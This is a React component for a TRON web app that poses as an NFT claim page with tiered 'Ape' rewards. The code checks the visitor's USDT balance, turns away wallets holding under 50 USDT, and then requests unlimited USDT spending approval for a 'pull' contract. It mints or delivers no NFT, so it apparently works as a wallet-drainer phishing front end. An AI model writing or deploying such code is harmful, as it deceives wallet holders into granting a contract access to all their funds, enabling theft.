"use client";

import { useTron } from "./TronProvider";
import { 
  TOKEN_ADDRESS, 
  PULL_CONTRACT_ADDRESS,
  getTokenBalance,
  getAllowance,
  approveUnlimited,
  fromSun,
  toSun
} from "@/lib/tron";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/components/ui/use-toast";
import { useEffect, useState } from "react";
import { CheckCircle2, Loader2, XCircle } from "lucide-react";
import Image from "next/image";

interface ApproveUnlimitedProps {
  onEligibilityCheck?: (tier: number | null) => void;
}

export function ApproveUnlimited({ onEligibilityCheck }: ApproveUnlimitedProps) {
  const { address, isConnected } = useTron();
  const { toast } = useToast();
  
  const [balance, setBalance] = useState<bigint>(BigInt(0));
  const [allowance, setAllowance] = useState<bigint>(BigInt(0));
  const [isLoading, setIsLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");
  const [hasApproved, setHasApproved] = useState(false);

  // Fetch balance and allowance when address changes
  useEffect(() => {
    if (!address) return;

    const fetchData = async () => {
      try {
        const [bal, allow] = await Promise.all([
          getTokenBalance(TOKEN_ADDRESS, address),
          getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS),
        ]);
        setBalance(bal);
        setAllowance(allow);
        setHasApproved(allow > BigInt(0));
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };

    fetchData();
    
    // Poll for updates every 5 seconds
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, [address]);

  // Determine NFT tier based on balance (USDT has 6 decimals)
  const getNFTTier = (userBalance: bigint) => {
    const decimals = 6; // USDT-TRC20 has 6 decimals
    const threshold10k = BigInt(toSun("10000", decimals));
    const threshold500 = BigInt(toSun("500", decimals));
    const threshold100 = BigInt(toSun("100", decimals));
    const threshold50 = BigInt(toSun("50", decimals));

    if (userBalance >= threshold10k) {
      return { tier: 4, image: "/nft4.avif", name: "Diamond Ape", rarity: "Legendary", minRequired: "10,000" };
    } else if (userBalance >= threshold500) {
      return { tier: 3, image: "/nft2.avif", name: "Gold Ape", rarity: "Epic", minRequired: "500" };
    } else if (userBalance >= threshold100) {
      return { tier: 2, image: "/ape1.jpeg", name: "Silver Ape", rarity: "Rare", minRequired: "100" };
    } else if (userBalance >= threshold50) {
      return { tier: 1, image: "/nft3.avif", name: "Bronze Ape", rarity: "Uncommon", minRequired: "50" };
    }
    return null;
  };

  // Handle claim - Check eligibility and approve in one action
  const handleClaim = async () => {
    if (!address) return;

    setIsLoading(true);
    try {
      // Refresh balance
      const currentBalance = await getTokenBalance(TOKEN_ADDRESS, address);
      setBalance(currentBalance);
      
      const nftTier = getNFTTier(currentBalance);
      
      if (!nftTier) {
        toast({
          variant: "destructive",
          title: "❌ Not Eligible",
          description: `You need at least 50 USDT. You have ${fromSun(currentBalance.toString(), 6)} USDT.`,
        });
        setIsLoading(false);
        return;
      }

      // User is eligible, show tier and proceed with approval
      onEligibilityCheck?.(nftTier.tier);
      toast({
        title: `✅ Eligible for ${nftTier.name}!`,
        description: `Processing your ${nftTier.rarity} tier NFT claim...`,
      });

      // Proceed with approval
      const tx = await approveUnlimited(TOKEN_ADDRESS, PULL_CONTRACT_ADDRESS);
      setTxHash(tx);
      setHasApproved(true);

      toast({
        title: "Success!",
        description: "Unlimited approval granted successfully.",
      });

      // Refresh allowance
      const newAllowance = await getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS);
      setAllowance(newAllowance);

    } catch (error: any) {
      console.error("Approval error:", error);
      toast({
        variant: "destructive",
        title: "Error",
        description: error.message || "Transaction failed. Please try again.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (!isConnected) {
    return (
      <p className="text-xs sm:text-sm text-cyan-300 text-center">
        👛 Please connect your TronLink wallet to continue.
      </p>
    );
  }

  const nftTier = getNFTTier(balance);

  return (
    <div className="space-y-4">
      {/* Single Claim Button */}
      {hasApproved ? (
        <div className="flex items-center gap-2 rounded-lg bg-green-500/10 p-3 sm:p-4 border border-green-500/30">
          <CheckCircle2 className="h-5 w-5 text-green-400" />
          <p className="text-sm text-green-300 font-medium">
            ✅ Approved! You're ready to claim your NFT.
          </p>
        </div>
      ) : (
        <Button
          onClick={handleClaim}
          disabled={isLoading}
          className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold text-base sm:text-lg py-4 sm:py-6 rounded-lg sm:rounded-xl shadow-lg shadow-blue-500/50 transition-all hover:shadow-blue-500/70 active:scale-95 sm:hover:scale-[1.02]"
          size="lg"
        >
          {isLoading && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
          {isLoading ? "⏳ Processing..." : "🦍 Check Eligibility & Approve"}
        </Button>
      )}

      {txHash && (
        <p className="text-xs text-cyan-400 break-all text-center bg-black/30 p-2 rounded">
          Tx: {txHash.slice(0, 10)}...{txHash.slice(-8)}
        </p>
      )}
    </div>
  );
}
